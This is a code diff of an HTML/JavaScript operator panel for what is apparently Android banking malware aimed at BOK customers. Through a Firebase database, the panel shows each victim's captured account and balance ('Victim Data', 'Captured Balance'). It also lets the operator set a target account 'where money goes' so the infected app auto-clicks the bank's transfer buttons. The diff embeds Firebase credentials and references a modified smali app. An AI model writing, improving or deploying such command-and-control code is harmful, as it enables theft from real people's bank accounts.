@@ -2,87 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Control Center</title>
+    <title>BOK System Control v5.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --primary: #58a6ff; --success: #3fb950; --danger: #f85149; --text: #c9d1d9; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
-        .wrapper { max-width: 1000px; margin: auto; }
-        .header { background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid #30363d; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-        .panel { background: var(--card); border: 1px solid #30363d; border-radius: 12px; padding: 20px; }
-        .stat-label { color: #8b949e; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; }
-        .stat-value { font-size: 24px; font-weight: bold; color: var(--success); font-family: monospace; }
-        
-        /* Control Buttons Styling */
-        .controls { margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
-        .ctrl-item { background: #0d1117; padding: 15px; border-radius: 8px; border: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
-        
-        /* Toggle Switch */
-        .switch { position: relative; display: inline-block; width: 60px; height: 30px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 22px; width: 22px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--primary); }
-        input:checked + .slider:before { transform: translateX(30px); }
-        
-        .pulse { animation: pulse-animation 2s infinite; }
-        @keyframes pulse-animation { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        :root { --bg: #0d1117; --card: #161b22; --primary: #58a6ff; --text: #c9d1d9; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; }
+        .container { max-width: 800px; margin: auto; }
+        .card { background: var(--card); border: 1px solid #30363d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; }
+        .value { font-size: 24px; font-weight: bold; color: #3fb950; font-family: monospace; margin: 10px 0; }
+        input[type="text"] { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 5px; margin-top: 10px; box-sizing: border-box; }
+        button { background: #238636; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
+        button:hover { background: #2ea043; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="header">
-        <div>
-            <h1 style="margin:0; font-size: 22px;">System Command Center</h1>
-            <span id="net-status" style="font-size: 12px; color: var(--danger)">● Offline</span>
-        </div>
-        <div style="text-align: right">
-            <div class="stat-label">Project ID</div>
-            <div style="font-size: 14px; font-weight: bold;">sudancontrol-c5050</div>
-        </div>
+<div class="container">
+    <h2>BOK Live Monitor</h2>
+
+    <div class="card">
+        <div class="label">Captured Balance (From App)</div>
+        <div id="balance_val" class="value">0.00 SDG</div>
     </div>
 
-    <div class="grid">
-        <div class="panel">
-            <h3 style="margin-top:0; color: var(--primary)">Victim Data</h3>
-            <div style="margin-bottom: 20px;">
-                <div class="stat-label">Last Captured Account</div>
-                <div id="acc_val" class="stat-value">---</div>
-            </div>
-            <div>
-                <div class="stat-label">Available Balance</div>
-                <div id="cash_val" class="stat-value">0.00</div>
-            </div>
-        </div>
-
-        <div class="panel">
-            <h3 style="margin-top:0; color: var(--primary)">Remote Commands</h3>
-            <div class="controls">
-                <div class="ctrl-item">
-                    <span>System Status (Active)</span>
-                    <label class="switch">
-                        <input type="checkbox" id="status_btn" onchange="sendCmd('status', this.checked)">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-                <div class="ctrl-item">
-                    <span>Turbo Execution</span>
-                    <label class="switch">
-                        <input type="checkbox" id="turbo_btn" onchange="sendCmd('turbo', this.checked)">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-            </div>
-            <p style="font-size: 11px; color: #8b949e; margin-top: 15px;">* Turning ON will trigger the auto-clicker in the App.</p>
-        </div>
+    <div class="card">
+        <h3 style="margin-top:0">Withdrawal Setup</h3>
+        <div class="label">Target Account Number (Where money goes)</div>
+        <input type="text" id="target_acc" placeholder="Enter Account Number">
+        <button onclick="updateTarget()">Set Target & Start Pull</button>
+        <p style="font-size: 11px; color: #8b949e; margin-top: 10px;">* When you click, the App will read this number and start auto-clicking "تفاصيل" and "تحويل".</p>
     </div>
 </div>
 
 <script>
+    // Config from your google-services.json
     const firebaseConfig = {
         apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
         authDomain: "sudancontrol-c5050.firebaseapp.com",
@@ -94,38 +49,21 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Sync UI with Firebase Controls
-    db.ref('control').on('value', (snap) => {
-        const data = snap.val();
-        if (data) {
-            document.getElementById('status_btn').checked = (data.status === "true");
-            document.getElementById('turbo_btn').checked = (data.turbo === "true");
-        }
-    });
-
-    // Listen for Account Data
-    db.ref('Account').on('value', (snap) => {
-        if (snap.exists()) {
-            document.getElementById('net-status').innerHTML = "● Online";
-            document.getElementById('net-status').style.color = "#3fb950";
-            let lastAcc = "";
-            snap.forEach(child => { lastAcc = child.key; });
-            document.getElementById('acc_val').innerText = lastAcc;
-        }
-    });
-
-    // Listen for Cash Data
+    // Listen to Cash (matches SAVED_VALUE_KEY in Smali)
     db.ref('Cash').on('value', (snap) => {
-        if (snap.exists()) {
-            document.getElementById('cash_val').innerText = snap.val() + " SDG";
+        if(snap.exists()) {
+            document.getElementById('balance_val').innerText = snap.val() + " SDG";
         }
     });
 
-    // Function to Send Commands
-    function sendCmd(path, isChecked) {
-        const val = isChecked ? "true" : "false";
-        db.ref('control').child(path).set(val)
-        .then(() => console.log("Sent: " + val))
+    // Function to set the Account (matches hsab() function in Smali)
+    function updateTarget() {
+        const accNum = document.getElementById('target_acc').value;
+        if(accNum === "") return alert("Please enter account number");
+
+        // We push to 'Account' table as the Smali code listens here
+        db.ref('Account').set(accNum)
+        .then(() => alert("Target Updated! App will now trigger pull."))
         .catch(err => alert("Error: " + err.message));
     }
 </script>
